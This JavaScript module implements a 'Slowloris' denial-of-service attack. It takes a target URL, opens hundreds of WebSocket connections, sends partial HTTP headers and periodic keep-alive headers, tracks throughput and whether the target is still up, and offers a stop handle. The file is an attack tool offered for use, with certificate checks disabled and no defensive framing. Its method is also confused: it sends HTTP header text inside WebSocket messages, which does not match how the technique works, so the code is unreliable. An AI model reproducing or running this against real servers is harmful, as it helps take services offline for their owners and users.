import { WebSocket } from 'ws';

function slowloris(target, numSockets, statsCallback) {
    if (!target) {
        console.error("Target URL is required.");
        return;
    }

    let sockets = [];
    let packetsSent = 0;
    let startTime = Date.now();
    let targetStatus = "Unknown";
    let mbps = 0;
    let bytesSent = 0;
    let statsInterval;
    let attackActive = true;

    try {
        const parsedTarget = new URL(target);
        const hostname = parsedTarget.hostname;
        const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
        const isSecure = parsedTarget.protocol === 'https:';
        const path = parsedTarget.pathname || "/";

        if (!numSockets || numSockets <= 0) {
            numSockets = 200;
        }

        console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);

        function updateStats() {
            const elapsedTime = (Date.now() - startTime) / 1000;
            mbps = elapsedTime > 0 ? (bytesSent / elapsedTime) / 1000000 : 0;

            if (statsCallback) {
                statsCallback({
                    mbps: mbps.toFixed(2),
                    packetsSent: packetsSent,
                    targetStatus: targetStatus,
                    elapsedTime: elapsedTime.toFixed(0)
                });
            }
        }

        statsInterval = setInterval(updateStats, 1000);

        function createSocket(hostname, port, index, isSecure, path) {
            if (!attackActive) return;
            let socket;
            try {
                const protocol = isSecure ? 'wss://' : 'ws://';
                socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
                    origin: `${protocol}${hostname}`,
                    rejectUnauthorized: false
                });

                sockets.push(socket);

                socket.on('open', () => {
                    console.log(`Socket ${index + 1} opened.`);
                    targetStatus = "Online";
                    sendInitialHeader(socket, hostname, path);
                    const keepAliveInterval = setInterval(() => {
                        sendKeepAliveHeader(socket);
                    }, 15000);

                    socket.keepAliveInterval = keepAliveInterval;
                });

                socket.on('close', () => {
                    console.log(`Socket ${index + 1} closed.`);
                    removeSocket(socket);
                    clearInterval(socket.keepAliveInterval);
                    if (sockets.length === 0) {
                        targetStatus = "Offline";
                    }
                });

                socket.on('error', (error) => {
                    console.error(`Socket ${index + 1} error: ${error.message}`);
                    targetStatus = "Unresponsive";
                    closeSocket(socket, index);
                });

                socket.on('message', (data) => {
                });


            } catch (socketError) {
                console.error(`Error creating socket ${index + 1}:`, socketError.message);
                removeSocket(socket);
            } finally {
                 if (attackActive && sockets.length < numSockets) {
                    setTimeout(() => createSocket(hostname, port, index, isSecure, path), 100);
                }
            }
        }

        function sendInitialHeader(socket, hostname, path) {
            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\nX-Custom-Header: initial\r\n\r\n`;
            sendMessage(socket, initialHeader);
        }

        function sendKeepAliveHeader(socket) {
            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
            sendMessage(socket, keepAliveHeader);
        }

        function sendMessage(socket, message) {
             try {
                if (socket.readyState === WebSocket.OPEN) {
                    socket.send(message);
                    packetsSent++;
                    bytesSent += message.length;
                } else {
                    closeSocket(socket);
                }
            } catch (error) {
                console.error("Error sending message:", error.message);
                closeSocket(socket);
            }
        }

        function closeSocket(socket, index) {
            try {
                if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
                    clearInterval(socket.keepAliveInterval);
                    socket.close();
                }
                removeSocket(socket);
            } catch (closeError) {
                console.error(`Error closing socket ${index ? index + 1 : ''}:`, closeError.message);
            }
        }

        function removeSocket(socket) {
             sockets = sockets.filter(s => s !== socket);
        }

        for (let i = 0; i < numSockets; i++) {
            createSocket(hostname, port, i, isSecure, path);
        }


    } catch (error) {
        console.error("Error during Slowloris setup:", error.message);
    }

    return {
        stop: () => {
            attackActive = false;
            sockets.forEach(socket => {
                closeSocket(socket);
            });
            sockets = [];
            clearInterval(statsInterval);
            console.log("Slowloris attack stopped.");
        }
    };
}

export { slowloris };